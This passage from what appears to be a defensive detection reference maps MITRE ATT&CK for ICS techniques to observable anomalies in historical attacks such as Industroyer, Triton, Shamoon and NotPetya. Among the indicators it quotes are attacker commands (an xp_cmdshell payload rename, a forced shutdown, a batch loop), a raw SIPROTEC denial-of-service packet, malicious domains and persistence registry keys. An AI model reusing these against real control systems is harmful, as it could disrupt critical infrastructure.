- T0862 - Supply Chain Compromise: Anomalous Installation of Data Communications Line: From External Corporate Entity to Local Environment: Transmission System 1 (T1) Line: Bridging Consultant Company Network to Local Corporate Network: Connected Behind External-Facing Firewall: Used by Consultant

- T0866 - Exploitation of Remote Services: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

- T0883 - Internet Accessible Device: Anomalous Installation of Data Communications Line: From External Corporate Entity to Local Environment: Transmission System 1 (T1) Line: Bridging Consultant Company Network to Local Corporate Network: Connected Behind External-Facing Firewall: Used by Consultant

- T0890 - Exploitation for Privilege Escalation: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

## NIGHT DRAGON CAMPAIGN (2007 TO 2011) TARGETING A U.S.-BASED OIL AND GAS FIRM

- T0802 - Automated Collection: Anomalous Command Issued Via Command-Line: Associated with Execution of Anomalous Executable: gsecdump.exe: Command-Line Arguments (#{gsecdump_exe})

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line

- T0811 - Data from Information Repositories: Anomalous Network Traffic: From Local Host to Remote External Host: Containing Local File Information: Associated with Anomalous Executable: zwShell.exe

- T0819 - Exploit Public-Facing Application: Anomalous Network Traffic: From Local Host to Application Server: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Anomalous Number of Hypertext Transfer Protocol (HTTP) GET Requests

- T0843 - Program Download: Anomalous Binary Configured on Local Host: Dynamic Link Library (DLL): PluginFile.dll, PluginScreen.dll, PluginCmd.dll, PluginKeyboard.dll, PluginProcess.dll, PluginService.dll, and PluginRegedit.dll: Multiple Anomalous Dynamic Link Libraries (DLLs) Configured on Local Host

- T0846 - Remote System Discovery: Anomalous Network Traffic: From Local Host to External IP: Domain Name System (DNS) Over UDP Port 53: Request to Anomalous Domain: is-a-chef.com, thruhere.net, office-on-the.net, and selfip.com: Requests to Multiple Anomalous Domains

- T0849 - Masquerading: Anomalous System Behavior on Local Host: Anomalous Executable Modification: In C:\Windows\Temp Directory: Modification of Filename: Executable Filename Renamed to Filename of Common Executable: CMD.EXE Renamed to svchost.exe

- T0853 - Scripting: Anomalous Network Traffic: From External Host to Local Host: Over TCP Port 25: Associated with Connect.dll: Contains Anomalous Dynamic Link Library (DLL)

- T0859 - Valid Accounts: Anomalous System Behavior on Local Host: Anomalous Virtual Private Network (VPN) Client Authentication Log: Anomalous Location

- T0863 - User Execution: Anomalous Network Traffic: From Local Host to Web Server: Domain Name Service (DNS) Over TCP Port 53: Request to Anomalous Domain

- T0865 - Spearphishing Attachment: Presence of Anomalous Email on Local Host: Spam Email with Anomalous Universal Resource Locator (URL)

- T0867 - Lateral Tool Transfer: Anomalous Network Traffic: From External Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 1234

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From Local Host to Domain Server: Domain Name Service (DNS) Over UDP Port 53: Request to Anomalous Domain: is-a-chef.com, thruhere.net, office-on-the.net, and selfip.com: Requests to Multiple Anomalous Domains

- T0872 - Indicator Removal on Host: Anomalous System Behavior on Local Host: Entry Created in the C:\Windows Directory: Containing the Date, Time, Path, and Name of KB****.log

- T0874 - Hooking: Creation of Anomalous File on Local Host: .txt. File: Containing Credential Information

- T0882 - Theft of Operational Information: Anomalous Network Traffic: From Company Web Server to External Remote Server: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Containing Local File Information: Market Intelligence Reports: Associated with Anomalous Executable: zwShell.exe

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Local Host to Domain Server: Domain Name Service (DNS) Over UDP Port 53: Request to Anomalous Domain: is-a-chef.com, thruhere.net, office-on-the.net, and selfip.com: Requests to Multiple Anomalous Domains

- T0886 - Remote Services: Anomalous Network Traffic: From Remote Host to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389

- T0889 - Modify Program: Anomalous System Behavior on Local Host: A New Process Has Been Created (Windows Event ID 4688): netsvcs

## BAKU-TBILISI-CEYHAN (BTC) PIPELINE EXPLOSION IN REFAHIYE, TURKEY 2008

- T0804 - Block Reporting Message: Anomalous Local Engineering Workstation (EWS) Successful Logon (Windows Event ID 4624): Timestamp Outside the User’s Normal Working Hours

- T0809 - Data Destruction: Anomalous System Behavior on Local Host: Anomalously Missing Files from Local Host: Anomalously Missing Files with Extensions Associated with Pelco Camera from Database Backup Folder: .pev File,| .pck File,| .pix File: Multiple File Extensions Associated with Pelco Camera from Database Backup Folder

- T0811 - Data from Information Repositories: Anomalous Network Traffic: From External Host to Local Host: To Local Engineering Workstation (EWS) with Remote Terminal Unit (RTU) Application: CitectSCADA 2008 Application: Over Microsoft (MS) Structured Language Query (SQL) Open Database Connectivity (ODBC) TCP Port 20222: Containing 400-Byte Strings

- T0814 - Denial of Service: Anomalous Network Traffic: From External Host to Local Host: To Local Engineering Workstation (EWS) with Remote Terminal Unit (RTU) Application: CitectSCADA 2008 Application: Over Microsoft (MS) Structured Language Query (SQL) Open Database Connectivity (ODBC) TCP Port 20222: Containing 400-Byte Strings

- T0819 - Exploit Public-Facing Application: Anomalous Network Traffic: From External Host to Local Host: To Local Engineering Workstation (EWS) with Remote Terminal Unit (RTU) Application: CitectSCADA 2008 Application: Over Microsoft (MS) Structured Language Query (SQL) Open Database Connectivity (ODBC) TCP Port 20222: Containing 400-Byte Strings

- T0828 - Loss of Productivity and Revenue: Extended Loss of Productivity: 20 Days

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Block Valve: Block Valve 30: Anomalous Increase in Flow Pressure

- T0838 - Modify Alarm Settings: Anomalous Local Engineering Workstation (EWS) Successful Logon (Windows Event ID 4624): Timestamp Outside the User’s Normal Working Hours

- T0840 - Network Connection Enumeration: Anomalous Network Traffic: From External Host to Local Host: From External Host to IP Camera: Network Session Established

- T0855 - Unauthorized Command Message: Anomalous Behavior of Controlled Process: Block Valve: Block Valve 30: Valve Anomalously Closed: Closed for Sustained Period

- T0859 - Valid Accounts: Anomalous Local Engineering Workstation (EWS) Successful Logon (Windows Event ID 4624): Timestamp Outside the User’s Normal Working Hours

- T0878 - Alarm Suppression: Anomalous Behavior of Controlled Process: Block Valve: Block Valve 30: Anomalous Increase in Flow Pressure

- T0879 - Damage to Property: Anomalous Behavior of Controlled Process: Block Valve: Block Valve 30: Anomalous Explosion

- T0880 - Loss of Safety: Anomalous System Behavior on Local Host: Anomalous Failure of Remote Terminal Unit (RTU)  Application to Alert Operators of Explosion: For 40 Minutes

- T0883 - Internet Accessible Device: Anomalous Network Traffic: From External Host to Local Host: From External Host to IP Camera: Network Session Established

## HAVEX MALWARE IN A U.S. MANUFACTURING FACILITY 2014

- T0802 - Automated Collection: Anomalous Network Traffic: From Control Device to Internal Host:  International Electrotechnical Commission (IEC) 61850 Over TCP Port 102

- T0813 - Denial of Control: Anomalous System Behavior on Local Host: Malfunction of Open Platform Communications (OPC) Clients

- T0814 - Denial of Service: Anomalous Network Traffic: From Internal Host to Control Device: Open Platform Communications (OPC) Host to Open Platform Communications (OPC) Client: Over Industrial Application Networking Protocol: Open Platform Communications (OPC) Traffic

- T0817 - Drive-by Compromise: Anomalous Network Traffic: From External Web Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0846 - Remote System Discovery: Anomalous Network Traffic: From Local Host to Multiple Local Hosts: Address Resolution Protocol (ARP) Traffic: Address Resolution Protocol (ARP) Connection Replies

- T0853 - Scripting: Anomalous Network Traffic: From Control Device to Internal Host:  International Electrotechnical Commission (IEC) 61850 Over TCP Port 102

- T0861 - Point & Tag Identification: Anomalous Network Traffic: From Internal Host to Control Device: Open Platform Communications Data Access (OPC DA) Host to Open Platform Communications Data Access (OPC DA) Client: Open Platform Communications Data Access (OPC DA) Over TCP Port 1024-65535: Content Contains Point and Tag Information

- T0862 - Supply Chain Compromise: End User Navigates to Trusted Website on Local Host: Original Equipment Manufacturer (OEM) Website

- T0863 - User Execution: Anomalous System Behavior on Local Host: Anomalous Autostart Registry Key Created (Windows Event ID 4657)

- T0865 - Spearphishing Attachment: End User Interaction with Anomalous Attachment: Anomalous Portable Document Format (PDF) Document: With Express Data Path (XDP) Embedded

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External Web Server to Internal Host: Hypertext Transfer Protocol (HTTP) Traffic over TCP Port 80: Downloads Received from Anomalous External Server

- T0872 - Indicator Removal on Host: Anomalous System Behavior on Local Host: Anomalous Files Written to Disk: In %AppData% Directory

- T0882 - Theft of Operational Information: Anomalous Network Traffic: From Internal Host to External Web Server: Hypertext Transfer Protocol (HTTP) Traffic over TCP Port 80: Data Files Sent to Anomalous External Server: Encrypted Files: .yls Files

- T0885 - Commonly Used Port: Anomalous Network Traffic: From External Web Server to Internal Host: Hypertext Transfer Protocol (HTTP) Traffic over TCP Port 80: Downloads Received from Anomalous External Server

- T0888 - Remote System Information Discovery: Anomalous Network Traffic: From Control Device to Internal Host:  International Electrotechnical Commission (IEC) 61850 Over TCP Port 102

## Cyber Attack on Thyssenkrupp Blast Furnace 2014

- T0802 - Automated Collection: A Registry Value was Modified (Windows Event ID 4657): Associated with Creation of Multiple Autostart Registry Keys: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,| HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce,| HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run,| HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

- T0813 - Denial of Control: Anomalous Network Traffic: From Local Host to Other Internal Hosts: Over Industrial Application Networking Protocol: 7-Technologies Interactive Graphical Scada System (IGSS) Over TCP Port 12401

- T0814 - Denial of Service: Anomalous Network Traffic: From Local Host to Other Internal Hosts: Over Industrial Application Networking Protocol: 7-Technologies Interactive Graphical Scada System (IGSS) Over TCP Port 12401

- T0817 - Drive-by Compromise: Anomalous Network Traffic: From External Web Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) POST Response: Comment Tags within Hypertext Transfer Protocol (HTTP) Request/Response: <!--havex (encrypted code) havex-->

- T0827 - Loss of Control: Anomalous Network Traffic: From Local Host to Other Internal Hosts: Over Industrial Application Networking Protocol: 7-Technologies Interactive Graphical Scada System (IGSS) Over TCP Port 12401

- T0828 - Loss of Productivity and Revenue: Anomalous Expense: $4,000,000 in Recovery Costs

- T0834 - Native API: A Registry Value was Modified (Windows Event ID 4657): Associated with HKCU\Software\Microsoft\Windows\CurrentVersion\Run load (REG_SZ) and HKCU\Software\Microsoft\Windows\CurrentVersion\Run TmProvider (REG_SZ)

- T0846 - Remote System Discovery: An Attempt was Made to Access an Object (Windows Event ID 4663): Associated with Anomalous Access to Component Object Model (COM) Objects: Object Linking and Embedding (OLE) for Open Platform Communications (OPC) Data Access (DA) Servers Objects: CLSID_OPCServerList

- T0859 - Valid Accounts: A Registry Value was Modified (Windows Event ID 4657): Associated with Creation of Multiple Autostart Registry Keys: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,| HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce,| HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run,| HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

- T0861 - Point & Tag Identification: Anomalous Network Traffic: From Local Host to Other Internal Hosts: Over Common Remote Client to Server Protocol: Remote Procedure Call (RPC) Over TCP Port 135: Component Object Model (COM) Connections

- T0863 - User Execution: Anomalous Attachment Executes Embedded Function on Local Host: From Trusted Source: Extensible Markup Language (XML) File

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From External Host to Local Server: Simple Mail Transfer Protocol (SMTP) Over TCP Port 25

- T0869 - Standard Application Layer Protocol: An Account Was Successfully Logged On (Windows Event ID 4624): Associated with Successful Logon from External Host

- T0872 - Indicator Removal on Host: Anomalous Network Traffic: From Local Host to External Remote Server: NetBIOS/Server Message Block (SMB) Over TCP Port 139

- T0879 - Damage to Property: Anomalous Behavior of Controlled Process: Uncontrolled Molten Metal Escaping from Blast Furnace

- T0880 - Loss of Safety: Anomalous Behavior of Controlled Process: Blow-Down Process Failure

- T0882 - Theft of Operational Information: An Account was Successfully Logged On (Windows Event ID 4624 Type 10): Associated with Successful Logon from Remote Server

- T0885 - Commonly Used Port: An Account Failed to Logon (Windows Event ID 4625): Associated with Unsuccessful Logon Attempt from Remote Server

- T0888 - Remote System Information Discovery: An Attempt was Made to Access an Object (Windows Event ID 4663): Associated with Anomalous Access to Component Object Model (COM) Objects: Object Linking and Embedding (OLE) for Open Platform Communications (OPC) Data Access (DA) Servers Objects: CLSID_OPCServerList

## UKRAINE ENERGY SECTOR CYBER ATTACK 2015 (BlackEnergy)

- T0803 - Block Command Message: Anomalous Behavior of Controlled Process: Unresponsive Substation Assets

- T0804 - Block Reporting Message: Anomalous Behavior of Controlled Process: Unresponsive Substation Assets

- T0809 - Data Destruction: Anomalous System Behavior on Local Host: Anomalous Application Failures: Missing Critical Files

- T0813 - Denial of Control: Anomalous System Behavior on Local Host: An Account Failed to Log On (Windows Event ID 4625)

- T0814 - Denial of Service: Anomalous Behavior of Local Utilities: Anomalous Unavailability of Telephone Services

- T0816 - Device Restart/Shutdown: Anomalous System Behavior on Local Host: Anomalous Unresponsive Service: Remote Service

- T0822 - External Remote Services: Anomalous Network Traffic: From External Remote Host to Local Host: Radmin Over TCP Port 4899

- T0823 - Graphical User Interface: Anomalous Network Traffic: From External Host to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389: Anomalous Increase in Network Traffic

- T0827 - Loss of Control: Anomalous Behavior of Controlled Process: Unresponsive Substation Assets: Failure to Boot

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Breaker State Change

- T0840 - Network Connection Enumeration: Anomalous Network Traffic: From Local Host to Other Internal Hosts: Connections to Sequential Ports

- T0849 - Masquerading: Anomalous System Behavior on Local Host: Anomalous Export of Application File

- T0853 - Scripting: Anomalous Network Traffic: From External Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Containing Anomalous Files: Matching Known Anomalous File Hash: BlackEnergy

- T0855 - Unauthorized Command Message: Anomalous Behavior of Controlled Process: Device Alarm Triggered by Anomalous Event in Controlled Process: Captured by Operational Database

- T0857 - System Firmware: Anomalous Industrial Network Traffic: From Local Host to Internal Device: From Engineering Workstation to Network Serial to Ethernet Converter Device: Moxa Serial to Ethernet Converter: Containing Firmware Binaries: Containing Read Only Memory (ROM) File

- T0859 - Valid Accounts: Anomalous Network Traffic: From Administrative Shares to Local Host: Server Message Block (SMB) Over TCP Port 445: Containing Anomalous Files

- T0863 - User Execution: Anomalous Network Traffic: From External Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Containing Known Anomalous Signatures

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From Local Host to External Server: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Anomalous Connections

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External Server to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Containing Documents

- T0881 - Service Stop: Anomalous Behavior of Controlled Process: Control Process Failures

- T0886 - Remote Services: Anomalous Network Traffic: From External Host to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389: Anomalous Increase in Network Traffic

## INDUSTROYER TARGETING UKRAINE ELECTRIC POWER TRANSPORT UTILITY (UKRENERGO) 2016

- T0800 - Activate Firmware Update Mode: Anomalous Behavior of Controlled Process: Controlled Process Unresponsive: Protective Relays Unresponsive

- T0801 - Monitor Process State: Anomalous Command Issued Via Command-Line: Anomalous Interface Command on Local Open Platform Communications (OPC) Server: IOPCBrowseServerAddressSpace Function: "ctlSelOn", "ctlSelOff", "ctlOperOn", "ctlOperOff", and "stVal": Multiple IOPCBrowseServerAddressSpace Function Commands

- T0802 - Automated Collection: Anomalous Command Issued Via Command-Line: Anomalous Interface Command on Local Open Platform Communications (OPC) Server: IOPCBrowseServerAddressSpace Function: "ctlSelOn", "ctlSelOff", "ctlOperOn", "ctlOperOff", and "stVal": Multiple IOPCBrowseServerAddressSpace Function Commands

- T0803 - Block Command Message: Anomalous System Behavior on Local Host: Anomalous Communication Failures: From Windows Host to Remote Terminal Unit (RTU)

- T0804 - Block Reporting Message: Anomalous System Behavior on Local Host: Anomalous Communication Failures: From Windows Host to Remote Terminal Unit (RTU)

- T0805 - Block Serial COM: Anomalous System Behavior on Local Host: Anomalous Communication Failures: From Windows Host to Remote Terminal Unit (RTU)

- T0806 - Brute Force I/O: Anomalous Behavior of Controlled Process: Anomalous Movement of Substation Breakers

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: "EXEC xp_cmdshell ‘move C:\Delta\m32.txt C:\Delta\m32.exe"

- T0809 - Data Destruction: Anomalous System Behavior on Local Host: Anomalous Application Utility Attempts to Run a Module: Module Associated with Industrial Control System Application: Haslo (Data Deletion Application)

- T0813 - Denial of Control: Anomalous Network Traffic: From Local Client to Controller: Over UDP Port 50000: Access to Controller Firmware Functionality: Protective Relay Firmware: SIPROTEC: Anomalous Packet Contents: 0x11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E

- T0814 - Denial of Service: Anomalous Behavior of Controlled Process: Controlled Process Unresponsive: Protective Relays Unresponsive

- T0815 - Denial of View: Anomalous System Behavior on Local Host: Anomalous Communication Failures: From Windows Host to Remote Terminal Unit (RTU)

- T0816 - Device Restart/Shutdown: Anomalous Behavior of Controlled Process: Controlled Process Unresponsive: Protective Relays Unresponsive

- T0827 - Loss of Control: Anomalous System Behavior on Local Host: Anomalous Application Utility Attempts to Run a Module: Module Associated with Industrial Control System Application: Haslo (Data Deletion Application)

- T0829 - Loss of View: Anomalous System Behavior on Local Host: Anomalous Application Utility Attempts to Run a Module: Module Associated with Industrial Control System Application: Haslo (Data Deletion Application)

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Anomalous Movement of Substation Breakers

- T0832 - Manipulation of View: Anomalous Command Issued Via Command-Line: Anomalous Interface Command on Local Open Platform Communications (OPC) Server: IOPCSyncIOprotocol Function: Duplicated Value: 0x01

- T0834 - Native API: Anomalous Behavior of Native Executable on Local Host: mshta.exe

- T0837 - Loss of Protection: Anomalous Behavior of Controlled Process: Controlled Process Unresponsive: Protective Relays Unresponsive

- T0840 - Network Connection Enumeration: Anomalous Behavior of Controlled Process: Anomalous Movement of Substation Breakers

- T0846 - Remote System Discovery: Anomalous Command Issued Via Command-Line: Anomalous Interface Command on Local Open Platform Communications (OPC) Server: IOPCBrowseServerAddressSpace Function: "ctlSelOn", "ctlSelOff", "ctlOperOn", "ctlOperOff", and "stVal": Multiple IOPCBrowseServerAddressSpace Function Commands

- T0849 - Masquerading: Anomalous Command Issued Via Command-Line: "EXEC xp_cmdshell ‘move C:\Delta\m32.txt C:\Delta\m32.exe"

- T0853 - Scripting: Anomalous Network Traffic: From Local Host to External IP: Server Message Block (SMB) Over TCP Port 445: Server Message Block (SMB) Request: With Hard-Coded IP

- T0855 - Unauthorized Command Message: Anomalous Behavior of Controlled Process: Anomalous Movement of Substation Breakers

- T0859 - Valid Accounts: A Kerberos Service Ticket Was Requested (Windows Event ID 4769)

- T0863 - User Execution: Anomalous Network Traffic: From Local Host to External Remote Host: Over TCP/UDP Port 8820: To IP Address 188.42.253.43

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From Local Host to Email Server: Simple Mail Transfer Protocol (SMTP) Over TCP Port 25

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line

- T0884 - Connection Proxy: Anomalous Network Traffic: From External Host to Local Host: From Proxy Host to Local Host: Over TCP Port 443: The Onion Router (Tor) Proxy Service: Containing The Onion Router (Tor) Node List

- T0888 - Remote System Information Discovery: Anomalous Command Issued Via Command-Line: Anomalous Interface Command on Local Open Platform Communications (OPC) Server: IOPCBrowseServerAddressSpace Function: "ctlSelOn", "ctlSelOff", "ctlOperOn", "ctlOperOff", and "stVal": Multiple IOPCBrowseServerAddressSpace Function Commands

## CONFICKER INFECTION OF GUNDREMMINGEN NUCLEAR POWER PLANT 2016

- T0804 - Block Reporting Message: Anomalous System Behavior on Local Host: Prevents Access to Safe Mode

- T0826 - Loss of Availability: Anomalous Downtime: Two Days

- T0828 - Loss of Productivity and Revenue: Anomalous IT Expenditures

- T0831 - Manipulation of Control: Anomalous System Behavior on Local Host: Anomalous Execution of Arbitrary Code: From Distributed External IP Hosts

- T0834 - Native API: Anomalous Application Programming Interface (API) Calls (Visible on Network if Server Message Block (SMB) Traffic is not Encrypted)

- T0843 - Program Download: Anomalous File Download to Local Host: loadadv.exe

- T0846 - Remote System Discovery: Anomalous Network Traffic: From Local Host to Remote Server: Domain Name System (DNS) Traffic Over UDP Port 53

- T0847 - Replication Through Removable Media: Anomalous Drive Creation (Windows Event ID 6416)

- T0849 - Masquerading: Creation of Anomalous Binary on Local Host

- T0851 - Rootkit: Anomalous System Behavior on Local Host: Blocking of Predetermined Domain Name System (DNS) Requests

- T0853 - Scripting: Anomalous File Downloaded to Local Host: Portable Executable (PE) Dynamic Link Library (DLL) File Dropped to Disk (Sysmon ID 11)

- T0859 - Valid Accounts: Anomalous Access of Admin Share (Windows Event ID 5140): Server Message Block (SMB) Traffic Over TCP Port 445

- T0866 - Exploitation of Remote Services: A Remote Procedure Call (RPC) Was Attempted (Windows Event ID 5712): Associated with Anomalous Remote Procedure Call (RPC) Traffic Over TCP Port 445

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From Local Host to Remote Server: Hypertext Transfer Protocol (HTTP) Traffic: To Anomalous URLs

- T0878 - Alarm Suppression: Anomalous System Behavior on Local Host: Prevents Access to Safe Mode

- T0881 - Service Stop: Anomalous System Behavior on Local Host: Antivirus Service Unable to Receive Updated Signature List

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Local Host to Remote Server: Hypertext Transfer Protocol (HTTP) Traffic: To Anomalous URLs

- T0886 - Remote Services: Anomalous Access of Admin Share (Windows Event ID 5140): Server Message Block (SMB) Traffic Over TCP Port 445

- T0888 - Remote System Information Discovery: Anomalous Network Traffic: From Local Host to Remote Server: Hypertext Transfer Protocol (HTTP) Traffic Over TCP Port 80

- T0889 - Modify Program: Anomalous File Download to Local Host

## SHAMOON 2017 MALWARE CAMPAIGN AGAINST SADARA CHEMICAL COMPANY

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: ‘for /F %J in ([1-400.txt]) do ok.bat %J’

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: Executable Run via Command Line with Anomalous Argument: '<space>1'

- T0816 - Device Restart/Shutdown: Anomalous Command Issued Via Command-Line: 'shutdown -r -f -t 2'

- T0822 - External Remote Services: Anomalous Network Traffic: From External Host to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389

- T0828 - Loss of Productivity and Revenue: Anomalous System Behavior on Local Host: Anomalous Deletion of Data: An Object Was Deleted (Windows Event ID 4660)

- T0834 - Native API: Anomalous Call to Windows Application Programming Interface (API) on Local Host: NetScheduleJobAdd: By Native Windows Binary: netapi32.dll

- T0846 - Remote System Discovery: Anomalous Network Traffic: From Internal Host to Other Internal Host: Across the Entire Class C Subnet

- T0849 - Masquerading: Anomalous System Behavior on Local Host: A Service Was Installed in the System (Windows Event ID 4697): Service Installed by Anomalous Executable: Maintenace Srv (Where Maintenance is Misspelled)

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: Associated with Execution of Anomalous Processes

- T0859 - Valid Accounts: Anomalous Network Traffic: From Local Host to Other Internal Hosts on Local Subnet: Remote Desktop Protocol (RDP) Over TCP Port 3389: Terminal Services

- T0863 - User Execution: Anomalous System Behavior on Local Host: A New Process Has Been Created (Windows Event ID 4688): Anomalous PowerShell Child Process Spawned by Microsoft Office Document

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From Local Host to External IP: Hypertext Transfer Protocol (HTTP) Over TCP Port 80

- T0869 - Standard Application Layer Protocol: Anomalous File Written to Local Host: In %WinDir%\inf\ Directory: usbvideo324.pnf

- T0872 - Indicator Removal on Host: Anomalous System Behavior on Local Host: An Attempt Was Made to Access an Object (Windows Event ID 4663)

- T0884 - Connection Proxy: Anomalous File Written to Local Host: In %WinDir%\inf\ Directory: usbvideo324.pnf

- T0886 - Remote Services: Anomalous Network Traffic: Associated with Native Operating System Remote Service: Associated with RegConnectRegistryW Request: On Multiple Systems in Same Network Segment: Within a Short Time Window

- T0889 - Modify Program: Anomalous Network Traffic: From Local Host to Other Internal Hosts on Local Subnet: Associated with Windows Service: NetScheduleJobAdd

## WANNACRY RANSOMWARE ATTACK ON RENAULT-NISSAN

- T0809 - Data Destruction: Anomalous Failed Restoration Attempts

- T0826 - Loss of Availability: Anomalous Increase in OT Domain Alarms

- T0828 - Loss of Productivity and Revenue: Operations Halted for Three Days

- T0840 - Network Connection Enumeration: Anomalous Increase in Host Latency

- T0866 - Exploitation of Remote Services: Anomalous Connections on TCP Port 139 (SMB version 1)

- T0867 - Lateral Tool Transfer: Anomalous Inbound Traffic from Random IPs via TCP Port 3389 (RDP)

- T0869 - Standard Application Layer Protocol: Anomalous Logon Over SMB Using Doublepulsar in Host Memory

- T0871 - Execution through API: Anomalous Increase in Host System Resource Utilization

- T0881 - Service Stop: Anomalous Process Initiated (Windows Event ID 4688): WanaDecryptor Process Initiated

- T0884 - Connection Proxy: Anomalous Increase in CPU System Resource Usage Management

- T0886 - Remote Services: Anomalous Increase in Network Traffic

- T0889 - Modify Program: Host System Registry Key Added (Windows Event ID 4657): "HKCU\Control Panel\Desktop\Wallpaper: <software working directory>\@WanaDecryptor@.bmp"

## TRITON MALWARE ATTACK AGAINST PETRO RABIGH

- T0820 - Exploitation for Evasion: Anomalous Program Disables a Firmware RAM/ROM Consistency Check: Disabled by inject.bin

- T0822 - External Remote Services: Anomalous Usage of Virtual Private Network (VPN) Account

- T0826 - Loss of Availability: Emergency Shutdown of Controlled Process: Initiated by Safety Instrumented System (SIS): Emergency Shutdown of Controlled Refinery Process

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Productivity: 10 Days

- T0843 - Program Download: Controller Set in Programming State

- T0845 - Program Upload: Anomalous Function Code in Industrial Network Traffic: Triconex Communication Module (TCM) Protocol Traffic: Triconex Communication Module (TCM) Function Code 1 (Start Download Change)

- T0846 - Remote System Discovery: Anomalous Industrial Network Traffic on UDP Port 1502: Over Schneider TriStation Protocol: Via Broadcast Address 255.255.255.255

- T0849 - Masquerading: Anomalous Entry in ShimCache

- T0853 - Scripting: Presence of Anomalous Py2EXE Compiled Binaries: Library.zip

- T0859 - Valid Accounts: Anomalous Executable: KB77846376.exe

- T0868 - Detect Operating Mode: Anomalous Traffic from Control Device to Executable Application: From Triconex Communication Module (TCM) Hardware: To Trilog.exe

- T0869 - Standard Application Layer Protocol: Anomalous Command Packets Sent to Controllers

- T0871 - Execution through API: Anomalous Increase in Broadcast Messages over Triconex Communication Module (TCM)

- T0872 - Indicator Removal on Host: Anomalous Memory Writes on Controller Created by Anomalous Script: Python Script: script_test.py

- T0874 - Hooking: Anomalous Shellcode on Safety Instrumented System (SIS) Controllers: imain.bin

- T0881 - Service Stop: Emergency Shutdown of Controlled Process: Initiated by Safety Instrumented System (SIS): Emergency Shutdown of Controlled Refinery Process

- T0883 - Internet Accessible Device: Anomalous Inbound Traffic Over Kerberos on TCP Port 88

- T0885 - Commonly Used Port: Anomalous Industrial Network Traffic on UDP Port 1502: Over Schneider TriStation Protocol

- T0886 - Remote Services: Anomalous PsExec Command Running on Local Host

- T0890 - Exploitation for Privilege Escalation: Execution of Anomalous Program on Host: inject.bin

## NOTPETYA MALWARE ATTACK ON AP MOLLER-MAERSK 2017

- T0802 - Automated Collection: Anomalous Executable Uses Named Pipe: 561D.tmp: \\.\pipe\{C1F0BF2D-8C17-4550-AF5A-65A22C61739C}

- T0807 - Command-Line Interface: Anomalous Process Execution (Windows Event ID 4688): From C:\Windows\system32 Directory: rundll32.exe

- T0809 - Data Destruction: Anomalous Encryption of User Files: Files with .3ds, .7z, .accdb, .ai, .asp, .aspx, .avhd, .back, .bak, .c, .cfg, .conf, .cpp, .cs, 
.ctl, .dbf, .disk, .djvu, .doc, .docx., .dwg, .eml, .fdb, .gz, .h, .hdd, .kdbx, .mail, 
.mdb, .msg, .nrg, .ora, .ost, .ova, .ovf, .pdf, .php, .pmf, .ppt, .pptx, .pst, .pvi, 
.py, .pyc, .rar, .rtf, .sln, .sql, .tar, .vbox, .vbs, .vcb, .vdi, .vfd, .vmc, .vmdk, 
.vmsd, .vmx, .vsdx, .vsv, .work, .xls, .xlsx, .xvd, and .zip Extensions: Bulk File Encyrption

- T0816 - Device Restart/Shutdown: Anomalous System Shutdowns Across Organization

- T0826 - Loss of Availability: Report of Anomalous Loss of Availability: Network Systems

- T0827 - Loss of Control: Report of Anomalous Loss of Control: Network Systems

- T0828 - Loss of Productivity and Revenue: Anomalous Decrease in Business Volume: 20% Decrease

- T0829 - Loss of View: Report of Anomalous Loss of View: Network Systems

